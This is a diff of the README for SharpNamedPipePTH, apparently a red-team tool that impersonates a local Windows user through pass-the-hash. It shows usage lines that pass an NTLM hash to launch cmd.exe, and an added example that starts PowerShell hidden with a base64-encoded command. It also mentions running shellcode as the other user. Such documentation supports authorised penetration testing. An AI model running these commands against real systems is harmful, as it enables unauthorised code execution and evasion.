@@ -16,13 +16,17 @@ My personal goals for a tool/technique were:
 
 The impersonated user unfortunately has *no network authentication* allowed, as the new process is using an Impersonation Token which is restricted. So you can only use this technique for local actions with another user.
 
-There are two ways to use SharpNamedPipePTH. Either you can execute a binary with given arguments:
+There are two ways to use SharpNamedPipePTH. Either you can execute a binary (with or without arguments):
 
 `
 SharpNamedPipePTH.exe username:testing hash:7C53CFA5EA7D0F9B3B968AA0FB51A3F5 binary:C:\windows\system32\cmd.exe
 `
 
 ![alt text](https://github.com/S3cur3Th1sSh1t/SharpNamedPipePTH/blob/main/Resources/Example1.JPG?raw=true)
+
+`
+SharpNamedPipePTH.exe username:testing domain:localhost  hash:7C53CFA5EA7D0F9B3B968AA0FB51A3F5 binary:"C:\WINDOWS\System32\WindowsPowerShell\v1.0\powershell.exe" arguments:"-nop -w 1 -sta -enc bgBvAHQAZQBwAGEAZAAuAGUAeABlAAoA"
+`
 
 Or you can execute shellcode as the other user:
 
